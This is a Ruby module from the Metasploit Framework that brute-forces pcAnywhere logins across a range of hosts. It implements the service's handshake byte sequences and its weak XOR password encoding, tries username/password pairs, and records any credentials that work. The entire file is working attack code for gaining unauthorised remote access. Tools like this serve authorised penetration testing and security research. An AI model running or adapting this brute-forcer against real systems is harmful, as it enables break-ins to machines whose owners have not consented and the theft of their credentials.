##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core/exploit/tcp'

class Metasploit3 < Msf::Auxiliary

  include Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute


  def initialize
    super(
      'Name'        => 'PcAnywhere Login Scanner',
      'Description' => %q{
        This module will test pcAnywhere logins on a range of machines and
        report successful logins.
      },
      'Author'      => ['theLightCosine'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )

    register_options([Opt::RPORT(5631)])

  end

  def run_host(ip)
    connect
    hsr = pca_handshake(ip)
    return if hsr == :handshake_failed

    each_user_pass do |user, pass|
      next if user.blank? or pass.blank?
      print_status "Trying #{user}:#{pass}"
      result = do_login(user, pass)
      case result
      when :success
        print_good "#{ip}:#{rport} Login Successful #{user}:#{pass}"
        report_auth_info(
          :host        => rhost,
          :port        => datastore['RPORT'],
          :sname       => 'pcanywhere_data',
          :user        => user,
          :pass        => pass,
          :source_type => "user_supplied",
          :active      => true
        )
        return if datastore['STOP_ON_SUCCESS']
        print_status "Waiting to Re-Negotiate Connection (this may take a minute)..."
        select(nil, nil, nil, 40)
        connect
        hsr = pca_handshake(ip)
        return if hsr == :handshake_failed
      when :fail
        print_status "#{ip}:#{rport} Login Failure #{user}:#{pass}"
      when :reset
        print_status "#{ip}:#{rport} Login Failure #{user}:#{pass}"
        print_status "Connection Reset Attempting to reconnect in 1 second"
        select(nil, nil, nil, 1)
        connect
        hsr = pca_handshake(ip)
        return if hsr == :handshake_failed
      end
    end

  end

  def do_login(user, pass, nsock=self.sock)
    #Check if we are already at a logon prompt
    res = nsock.get_once(-1,5)
    euser = encryption_header(encrypt(user))
    nsock.put(euser)
    res = nsock.get_once(-1,5)

    #See if this knocked a login prompt loose
    if pca_at_login?(res)
      nsock.put(euser)
      res = nsock.get_once(-1,5)
    end

    #Check if we are now at the password prompt
    unless res and res.include? "Enter password"
      print_error "Problem Sending Login: #{res.inspect}"
      return :abort
    end

    epass = encryption_header(encrypt(pass))
    nsock.put(epass)
    res = nsock.get_once(-1,20)
    if res.include? "Login unsuccessful"
      disconnect()
      return :reset
    elsif res.include? "Invalid login"
      return :fail
    else
      disconnect()
      return :success
    end
  end

  def pca_handshake(ip, nsock=self.sock)
    print_status "Handshaking with the pcAnywhere service"
    nsock.put("\x00\x00\x00\x00")
    res = nsock.get_once(-1,5)
    unless res and res.include? "Please press <Enter>"
      print_error "Handshake(1) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
      return :handshake_failed
    end

    nsock.put("\x6F\x06\xff")
    res = nsock.get_once(-1,5)
    unless res and res.include? "\x78\x02\x1b\x61"
      print_error "Handshake(2) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
      return :handshake_failed
    end

    nsock.put("\x6f\x61\x00\x09\x00\xfe\x00\x00\xff\xff\x00\x00\x00\x00")
    res = nsock.get_once(-1,5)
    unless res and res == "\x1b\x62\x00\x02\x00\x00\x00"
      print_error "Handshake(3) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
      return :handshake_failed
    end

    nsock.put("\x6f\x62\x01\x02\x00\x00\x00")
    res = nsock.get_once(-1,5)
    unless res and res.include? "\x00\x7D\x08"
      print_error "Handshake(4) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
      return :handshake_failed
    end

    res = nsock.get_once(-1,5) unless pca_at_login?(res)
    unless pca_at_login?(res)
      print_error "Handshake(5) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
      return :handshake_failed
    end
  end

  def pca_at_login?(res)
    return true if res and (res.include? 'Enter login name' or res.include? 'Enter user name' )
    return false
  end

  def encrypt(data)
    return '' if data.nil? or data.empty?
    return '' unless data.kind_of? String
    encrypted = ''
    encrypted << ( data.unpack('C')[0] ^ 0xab )
    data.bytes.each_with_index do |byte, idx|
      next if idx == 0
      encrypted << ( encrypted[(idx - 1),1].unpack('C')[0] ^ byte ^ (idx - 1) )
    end
    return encrypted
  end

  def encryption_header(data)
    header = [6,data.size].pack('CC')
    header << data
    return header
  end

end
